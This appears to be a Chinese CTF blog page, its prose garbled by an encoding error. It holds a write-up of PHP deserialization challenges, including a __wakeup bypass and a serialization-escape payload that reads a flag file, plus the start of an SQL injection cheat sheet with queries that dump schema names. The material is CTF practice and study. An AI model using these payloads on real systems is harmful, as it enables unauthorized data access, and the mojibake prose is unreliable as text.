<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&quot;100&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line">	<span class="keyword">echo</span>(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ç¬¬äº”æ­¥</strong></p>
<p>ä¸ºäº†ç»•è¿‡__wakeupï¼Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šå±æ€§ä¸ªæ•°ä¸å®é™…æ•°ç›®ä¸ç¬¦æ—¶ï¼Œ__wakeupä¸ä¼šæ‰§è¡Œ</p>
<p>payloadå˜ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>åˆphpåœ¨å¯¹privateå±æ€§çš„å˜é‡åºåˆ—åŒ–æ—¶ï¼Œä¼šåœ¨ç±»åå‰åç”Ÿæˆç©ºå­—ç¬¦0x00ï¼Œå¤åˆ¶åˆ°å‰ªåˆ‡æ¿æ—¶ä¼šè¢«æˆªæ–­ï¼Œå› æ­¤éœ€è¦åŠ ä¸Š%00ï¼Œæ‰èƒ½æ­£å¸¸è§£æï¼ˆå‚è€ƒ<a target="_blank" rel="noopener" href="https://blog.csdn.net/bluedoorzz/article/details/107299068%EF%BC%89">https://blog.csdn.net/bluedoorzz/article/details/107299068ï¼‰</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f651d906-b073-4e71-ab2d-76e9567f9d71&#125;</span><br></pre></td></tr></table></figure>
<h2 id="wakeupçš„ç»•è¿‡"><a href="#wakeupçš„ç»•è¿‡" class="headerlink" title="__wakeupçš„ç»•è¿‡"></a>__wakeupçš„ç»•è¿‡</h2><p>å±æ€§ä¸ªæ•°ä¸å®é™…ä¸ç¬¦</p>
<h2 id="phpå¯¹privateå±æ€§çš„åºåˆ—åŒ–"><a href="#phpå¯¹privateå±æ€§çš„åºåˆ—åŒ–" class="headerlink" title="phpå¯¹privateå±æ€§çš„åºåˆ—åŒ–"></a>phpå¯¹privateå±æ€§çš„åºåˆ—åŒ–</h2><p>åˆphpåœ¨å¯¹privateå±æ€§çš„å˜é‡åºåˆ—åŒ–æ—¶ï¼Œä¼šåœ¨ç±»åå‰åç”Ÿæˆç©ºå­—ç¬¦0x00ï¼Œå¤åˆ¶åˆ°å‰ªåˆ‡æ¿æ—¶ä¼šè¢«æˆªæ–­ï¼Œå› æ­¤éœ€è¦åŠ ä¸Š%00ï¼Œæ‰èƒ½æ­£å¸¸è§£æ</p>
<h2 id="phpç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡çš„ä»£ç æ¨¡æ¿"><a href="#phpç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡çš„ä»£ç æ¨¡æ¿" class="headerlink" title="phpç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡çš„ä»£ç æ¨¡æ¿"></a>phpç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡çš„ä»£ç æ¨¡æ¿</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Name&#123;</span><br><span class="line">		private $username&#x3D;&quot;admin&quot;;</span><br><span class="line">		private $password&#x3D;&quot;100&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	$a &#x3D; new Name();</span><br><span class="line">	echo(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><p>è€ƒå¯Ÿï¼šphpä»£ç å®¡è®¡ï¼Œphpåºåˆ—åŒ–</p>
<p>æ‰“å¼€é¡µé¢ï¼Œæ‰“å¼€view-sourceï¼Œå¯ä»¥çœ‹åˆ°æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‹¥å·²ç»æ‹¥æœ‰SESSIONï¼Œåˆ™æŠŠSESSIONåˆ é™¤</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="comment"># å°†å…¨å±€å˜é‡$_POSTè§£å¼€ï¼Œç›¸å½“äºå¾—åˆ°$user=&#x27;guest&#x27;,$function=$function</span></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>æ ¹æ®ä»£ç ï¼Œè®¿é—®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:58008&#x2F;index.php?f&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥phpçš„é…ç½®ä¿¡æ¯ï¼Œå¹¶å¾—åˆ°flagçš„å¯èƒ½åœ°å€</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0g3_f1ag.php</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆæŒ‰ç…§å¸¸ç†ï¼Œç°åœ¨å°±åº”è¯¥æ˜¯åœ¨URLä¸Šæäº¤ï¼ˆGETæ–¹å¼ï¼‰æˆ–POSTæ•°æ®æäº¤ï¼ŒæŸ¥çœ‹ç›¸å…³æ–‡ä»¶çš„æ“ä½œäº†</p>
<p><strong>æ³¨æ„ï¼Œæ­¤å¤„æœ‰ä¸€ä¸ªå…³é”®è¦ç‚¹æ˜¯é€šè¿‡postæ–¹å¼æäº¤_SESSIONï¼Œä¿®æ”¹_SESSIONä¸­çš„å‚æ•°ï¼Œæ¥å®ç°æŸ¥çœ‹æ–‡ä»¶</strong></p>
<p>æ ¹æ®ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥è¦æŠŠd0g3_f1ag.phpåœ¨base64_encodeåï¼Œå¡«å……å…¥userinfoçš„imgä¸‹æ ‡ä¸­</p>
<p>è€Œuserinfoåˆæ˜¯ç”±è¿™ä¸€å¥å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br></pre></td></tr></table></figure>
<p>serialize_infoç”±$SESSIONå¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br></pre></td></tr></table></figure>
<p>è€ŒSESSIONä¼šç»è¿‡filterï¼Œä¸”å…¶ä¸­çš„imgæ ‡ç­¾ä¼šè¢«ä¿®æ”¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ ¹æ®wpï¼Œä½¿ç”¨phpåºåˆ—åŒ–çš„é€ƒé€¸ï¼Œæ„æˆä¸‹åˆ—payloadï¼ˆä¸‹é¢æœ‰è§£æï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;cb08b7952dfbcf0ed90a8d07db20e139&#125; </span><br></pre></td></tr></table></figure>


<h2 id="phpååºåˆ—åŒ–é€ƒé€¸åŸç†"><a href="#phpååºåˆ—åŒ–é€ƒé€¸åŸç†" class="headerlink" title="phpååºåˆ—åŒ–é€ƒé€¸åŸç†"></a>phpååºåˆ—åŒ–é€ƒé€¸åŸç†</h2><p>é¦–å…ˆåºåˆ—åŒ–æ ¼å¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; </span><br><span class="line">    [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;Hed9eh0g&quot;</span> </span><br><span class="line">    [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line">åºåˆ—åŒ–åä¼šå¾—åˆ°</span><br><span class="line"><span class="string">&#x27;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>å…¶æ¬¡ï¼Œåºåˆ—åŒ–æœ‰ä¸€ç§ç‰¹ç‚¹ï¼Œè‹¥åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€äº›å­—ç¬¦è¢«è¿‡æ»¤æ›¿æ¢ä¸ºç©ºï¼Œä¼šå°è¯•å‘åè¯»å–ç›¸åŒä½æ•°å­—ç¬¦ã€‚å¦‚ä¸‹flagè¢«è¿‡æ»¤çš„æƒ…å†µ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;</span><br><span class="line">    s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;</span><br><span class="line">    s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">        s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a:3:&#123;</span></span><br><span class="line"><span class="string">    s:4:&quot;</span>user<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:24:&quot;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>å› æ­¤ï¼Œå¯ä»¥æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œç»•è¿‡ç›¸å…³è¿‡æ»¤</p>
<p>æœ¬é¢˜ä¸­é€ƒé€¸çš„è§£æ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">æœªè¿‡æ»¤å‰</span><br><span class="line">_SESSION[flagflag]=<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">åºåˆ—åŒ–å</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>flagflag<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:58:&quot;</span></span><br><span class="line">		<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">è¿‡æ»¤å</span><br><span class="line">a:<span class="number">2</span>:&#123;</span><br><span class="line">	s:<span class="number">8</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">	s:<span class="number">58</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">		&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">		s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">	<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">ååºåˆ—åŒ–å¡«å……åï¼Œå†åºåˆ—åŒ–æ—¶</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>s:<span class="number">58</span>:<span class="string">&quot;&quot;</span>;<span class="string">&quot;; // å­—ç¬¦ä¸²é‡Œçš„ä¸œè¥¿éšä¾¿å¡«</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h1><h2 id="phpä¸‹çš„MD5å‡½æ•°"><a href="#phpä¸‹çš„MD5å‡½æ•°" class="headerlink" title="phpä¸‹çš„MD5å‡½æ•°"></a>phpä¸‹çš„MD5å‡½æ•°</h2><p>md5(string,raw)</p>
<p>stringï¼šå¿…é¡»ï¼Œè§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²</p>
<p>rawï¼šè¾“å‡ºæ ¼å¼ã€‚TRUEï¼ŒåŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›FALSEï¼Œé»˜è®¤ï¼Œ32å­—ç¬¦åå…­è¿›åˆ¶æ•°</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-id="ckk3rwd020000x4us71x47qlj" data-title="CTF_Web PHPä»£ç å®¡è®¡" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-SQLæ³¨å…¥æ€»ç»“" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/15/CTF-Web-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-date">
  <time class="dt-published" datetime="2021-01-15T00:51:02.000Z" itemprop="datePublished">2021-01-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/15/CTF-Web-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQLæ³¨å…¥æ€»ç»“</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>ä¸»è¦æ˜¯æ–¹ä¾¿æˆ‘è‡ªå·±æŸ¥</p>
<h1 id="è·å–è¡¨å"><a href="#è·å–è¡¨å" class="headerlink" title="è·å–è¡¨å"></a>è·å–è¡¨å</h1><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>ä¾‹é¢˜ï¼šsqllabs Less1ã€2ã€3ã€4</p>
<p>çŸ¥è¯†ç‚¹ï¼šinformation_schemaä½¿ç”¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># çˆ†æ•°æ®åº“å</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(scheme_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+ </span></span><br><span class="line"># çˆ†è¡¨å</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br><span class="line"># çˆ†åˆ—å</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">æ— ç©ºæ ¼ç‰ˆæœ¬</span><br><span class="line"><span class="keyword">select</span>(group_concat(scheme_name))<span class="keyword">from</span>(information_schema.schemata))#</span><br><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span><span class="string">&#x27;web_sqli&#x27;</span>)#</span><br><span class="line"><span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)#</span><br></pre></td></tr></table></figure>
<h2 id="ä¸é€‚ç”¨information-schema"><a href="#ä¸é€‚ç”¨information-schema" class="headerlink" title="ä¸é€‚ç”¨information_schema"></a>ä¸é€‚ç”¨information_schema</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()</span><br><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>


<h1 id="XPathæŠ¥é”™æ³¨å…¥"><a href="#XPathæŠ¥é”™æ³¨å…¥" class="headerlink" title="XPathæŠ¥é”™æ³¨å…¥"></a>XPathæŠ¥é”™æ³¨å…¥</h1><h2 id="updatexmlå’Œextractvalue"><a href="#updatexmlå’Œextractvalue" class="headerlink" title="updatexmlå’Œextractvalue"></a>updatexmlå’Œextractvalue</h2><p>ä¾‹é¢˜ï¼šsqllabs less5ã€6</p>
<p>è¯­å¥</p>
